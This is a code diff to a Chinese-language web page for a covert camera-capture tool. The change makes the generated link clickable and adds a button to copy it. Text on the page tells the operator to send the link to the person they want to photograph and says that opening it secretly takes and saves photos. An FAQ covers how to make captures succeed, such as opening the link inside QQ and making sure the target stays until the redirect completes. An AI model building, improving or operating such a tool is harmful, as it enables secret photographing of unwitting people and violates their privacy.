@@ -94,10 +94,19 @@
        var currentDirectory = getCurrentDirectory();
        var link = currentDirectory + '?id=' + myid + '&url=' + url;
        var kd = document.getElementById('kd');
-       kd.href = 'javascript:void(0)';
+       kd.href = link;
        kd.innerText = link; 
-       kd.style = '';
-       kd.onclick = function() { window.open(link, '_blank'); };
+       kd.style.pointerEvents = 'auto';
+       document.getElementById('copyBtn').style.display = 'block'; // 显示复制按钮
+   }
+
+   function copyToClipboard() {
+       var text = document.getElementById('kd').href;
+       navigator.clipboard.writeText(text).then(function() {
+           alert("链接已复制到剪贴板！");
+       }, function(err) {
+           alert("复制失败，请手动复制链接。");
+       });
    }
 
    function checkPhoto() {
@@ -119,7 +128,8 @@
      <button onclick="checkPhoto();">查看照片</button>
    </div>
    <p>将以下链接地址发送给你要拍摄的对象，对方进入后将会拍摄照片并保存：</p>
-   <p><a id="kd" style="pointer-events: none;">请先成链接！</a></p>
+   <p><a id="kd" style="pointer-events: none;">请先生成链接！</a></p>
+   <button id="copyBtn" style="display: none;" onclick="copyToClipboard();">复制链接</button> <!-- 复制按钮 -->
    <p>问题一：为什么拍摄的是黑屏？答：因为该浏览器不支持，更换浏览器即可，安卓用户建议直接在QQ内打开链接。</p>
    <p>问题二：拍摄的照片不全？答：还没等跳转完成就关闭了页面，数据还没传输完成。</p>
 </div>
